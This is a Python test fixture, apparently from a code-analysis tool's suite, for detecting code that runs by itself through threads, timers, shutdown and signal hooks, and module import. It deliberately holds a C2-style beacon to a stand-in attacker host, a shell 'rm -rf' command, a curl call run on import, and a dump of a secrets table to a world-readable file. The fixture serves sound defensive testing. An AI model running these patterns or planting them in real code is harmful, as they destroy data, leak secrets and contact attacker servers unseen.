# Copyright © 2026 Sthenos Security. All rights reserved.
# ============================================================================
# INVOCATION PATTERNS TEST — Case 2: Internal Triggers
#
# All functions execute automatically WITHOUT an external HTTP request.
# They are triggered by threads, timers, init hooks, startup events, etc.
#
# The call graph currently MISSES these because it only traces from
# recognized entrypoints (@app.route, main(), etc.).
#
# Expected:
#   app_reachability = REACHABLE (but RA currently says UNKNOWN/NOT_REACHABLE)
#   taint_verdict    = SAFE (constants, not user input) — BUT behavior may
#                      be malicious (C2 download, exfil, etc.)
#
# This tests whether:
#   1. The RA can detect internal triggers as entrypoints
#   2. The AI can classify invocation patterns (external vs internal vs dead)
#   3. Malware-like behavior in internal triggers is not downgraded by taint
# ============================================================================
"""Case 2: Internal triggers — thread, timer, init, startup, signal."""
import atexit
import os
import signal
import sqlite3
import subprocess
import threading
import time


# ── Subtype A: Threading ─────────────────────────────────────────────────

def _thread_worker_sqli():
    """CWE-89: SQL with constant value — triggered by thread.
    Internal trigger, constant argument → SAFE from taint perspective.
    But this code WILL execute when the module loads.
    """
    conn = sqlite3.connect('/tmp/bg.db')
    # CWE-89: f-string in SQL — argument is constant (not user input)
    table = "audit_log"
    conn.execute(f"DELETE FROM {table} WHERE age > 90")
    conn.close()

# Auto-starts when module is imported
_bg_thread = threading.Thread(target=_thread_worker_sqli, daemon=True)
_bg_thread.start()


# ── Subtype B: Timer ─────────────────────────────────────────────────────

def _timer_cleanup():
    """CWE-78: Shell command with constant — triggered by timer.
    Runs every 60 seconds after first load.
    """
    # CWE-78: subprocess with constant command
    subprocess.run("rm -rf /tmp/expired_sessions/*", shell=True)

# Fires 60 seconds after import
_cleanup_timer = threading.Timer(60.0, _timer_cleanup)
_cleanup_timer.daemon = True
_cleanup_timer.start()


# ── Subtype C: atexit (shutdown hook) ────────────────────────────────────

def _shutdown_report():
    """CWE-200: Writes sensitive info to file — triggered at process exit.
    atexit handlers run when the Python process terminates.
    """
    # CWE-200: Information exposure — writes DB state to world-readable file
    conn = sqlite3.connect('/tmp/bg.db')
    rows = conn.execute("SELECT * FROM secrets").fetchall()
    with open("/tmp/shutdown_report.txt", "w") as f:
        for row in rows:
            f.write(str(row) + "\n")
    conn.close()

atexit.register(_shutdown_report)


# ── Subtype D: Signal handler ────────────────────────────────────────────

def _signal_handler(signum, frame):
    """CWE-78: Shell command in signal handler — triggered by SIGUSR1.
    An external process can send SIGUSR1 to trigger this.
    """
    # CWE-78: subprocess with constant
    subprocess.run("tar czf /tmp/emergency_dump.tar.gz /var/log/app/", shell=True)

signal.signal(signal.SIGUSR1, _signal_handler)


# ── Subtype E: Module-level execution (auto-exec on import) ─────────────

# CWE-78: This runs immediately when the file is imported by ANYTHING
# No function call needed — just `import internal_trigger` triggers it
_startup_cmd = "curl -s https://telemetry.internal.example.com/ping"
os.system(_startup_cmd)  # CWE-78: command injection with constant


# ── Subtype F: Malicious internal trigger (C2 pattern) ───────────────────

def _beacon():
    """CWE-918: SSRF-like C2 beacon — triggered by background thread.
    This is the malware pattern: no external trigger, no user input,
    but contacts a suspicious external server.
    """
    import urllib.request
    # CWE-918: URL is constant (not user-controlled) but behavior is suspicious
    urllib.request.urlopen("https://c2-server.attacker.test/checkin")

_beacon_thread = threading.Timer(30.0, _beacon)
_beacon_thread.daemon = True
_beacon_thread.start()


# ── Subtype G: Class __init__ auto-trigger ───────────────────────────────

class AutoInitService:
    """Service that runs vulnerable code in __init__."""

    def __init__(self):
        # CWE-89: SQL with constant — runs when class is instantiated
        conn = sqlite3.connect('/tmp/bg.db')
        conn.execute(f"CREATE TABLE IF NOT EXISTS cache_{int(time.time())} (k TEXT, v TEXT)")
        conn.close()

# Instantiated at module level — __init__ runs on import
_service = AutoInitService()
